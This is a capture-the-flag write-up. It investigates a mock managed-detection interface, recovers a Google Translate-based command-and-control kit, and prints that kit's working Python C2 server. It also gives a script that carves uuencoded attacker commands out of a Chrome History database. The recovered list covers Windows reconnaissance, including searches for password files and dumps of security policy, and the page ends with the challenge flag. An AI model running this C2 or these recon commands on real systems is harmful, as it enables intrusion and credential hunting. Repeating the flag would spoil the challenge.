**Category**: Miscellaneous  
**Author**: John Hammond

![](./files/01%20-%20XMDR/01%20-%20XMDR.png)

---

The challenge instance hosts a mock [Managed Detection and Response](https://www.microsoft.com/en-us/security/business/security-101/what-is-mdr-managed-detection-response) interface.

![](./files/01%20-%20XMDR/01.png)

Investigating the Administrator's `Downloads` directory revealed an undetected file that was left behind:

![](./files/01%20-%20XMDR/02.png)

Upon clicking the `Task` button on the right, I was given the option to download the file:

![](./files/01%20-%20XMDR/03.png)

When we download this, it will be a password protected ZIP file containing the TAR/GZIP archive. Extracting it reveals a very basic C2 that utilizes Google Translate as a communication medium. There's no flag anywhere. The `server.py` file, however, revealed what the traffic might look like:

```Python
#!/usr/bin/python

from uuid import uuid4
from urlparse import urlparse, parse_qs
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer

serverPort = 80
secretkey = str(uuid4())

class webServer(BaseHTTPRequestHandler):

    def do_GET(self,):
        useragent = self.headers.get('User-Agent').split('|')
        querydata = parse_qs(urlparse(self.path).query)
        if 'key' in querydata:
            if querydata['key'][0] == secretkey:
                self.send_response(200)
                self.send_header("Content-type","text/html")
                self.end_headers()

                if len(useragent) == 2:
                    response = useragent[1].split(',')[0]
                    print(response.decode("base64"))
                    self.wfile.write("Not Found")
                    return
                cmd = raw_input("$ ")
                self.wfile.write("STARTCOMMAND{}ENDCOMMAND".format(cmd))
                return
        self.send_response(404)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write("Not Found")
        return

    def log_message(self, format, *args):
        return

try:
    server = HTTPServer(("", serverPort), webServer)
    print("Server running on port: {}".format(serverPort))
    print("Secret Key: {}".format(secretkey))
    server.serve_forever()
except KeyboardInterrupt:
    server.socket.close()
```

At this point I had almost nothing and it was a shot in the dark that perhaps the Chrome `History` file might contain C2 commands.

![](./files/01%20-%20XMDR/04.png)

The `History` file is just an sqlite3 database, so I wrote a Python script to carve out relevant entries:

```Python 3
#!/usr/bin/env python3
import sqlite3
import re
import urllib.parse
from codecs import decode

def main():
    conn = sqlite3.connect("History")
    curs = conn.cursor()
    curs.execute("SELECT * FROM urls")
    rows = curs.fetchall()
    conn.close()

    for item in rows:
        if "STARTCOMMAND" not in item[1]:
            continue
            
        data = re.findall("STARTCOMMAND(.+?)ENDCOMMAND", item[1])[0]
        data = urllib.parse.unquote(data)
        
        command = decode(data.encode(), "uu").decode().strip()
        
        print(command)
    
if __name__ == "__main__":
    main()
```

The output from the above script looked like this:

```
$ python extract.py

begin 664 -
,=VAO86UI("]A;&P*
`
end
...
```

I couldn't find anywhere in the C2 files where any kind of encoding besides base64 was occurring, so this was a bit confusing. A quick Google search revealed that I was looking at [uuencoding](https://en.wikipedia.org/wiki/Uuencoding). I made a minor adjustment to the above Python script to account for that and:

```
$ python extract.py
whoami /all
echo %USERNAME% && echo %USERDOMAIN% && echo %COMPUTERNAME%
systeminfo
tasklist /v
tasklist /svc
sc query
sc qc lanmanserver
net user
net localgroup administrators
net localgroup "Remote Desktop Users"
net share
net session
netstat -ano
netstat -ab
ipconfig /all
ipconfig /displaydns
arp -a
route print
nslookup -type=any google.com
ping -n 4 8.8.8.8
ping -n 4 8.8.8.8
getmac /v /fo list
echo flag{69200c13dcb39de19a405e9d1f993821}
wmic bios get serialnumber,version
wmic logicaldisk get name,size,freespace,providername
wmic process get ProcessId,Name,CommandLine
dir C: /s /b | findstr /i "password"
dir /a /s "C:Program Files"
attrib -s -h C:WindowsSystem32driversetchosts
icacls C:WindowsSystem32driversetchosts
fsutil volume diskfree C:
wevtutil qe System /c:10 /f:text
schtasks /query /fo LIST /v
reg query "HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun" /s
gpresult /r
secedit /export /cfg C:WindowsTempsecpol.cfg
```

Flag: **flag{69200c13dcb39de19a405e9d1f993821}**

---

**Files:**
- [extract.py](./files//01%20-%20XMDR/extract.py)
- [GTRS-1.zip](./files//01%20-%20XMDR/GTRS-1.zip)
- [History](./files//01%20-%20XMDR/History)
- [History.zip](./files//01%20-%20XMDR/History.zip)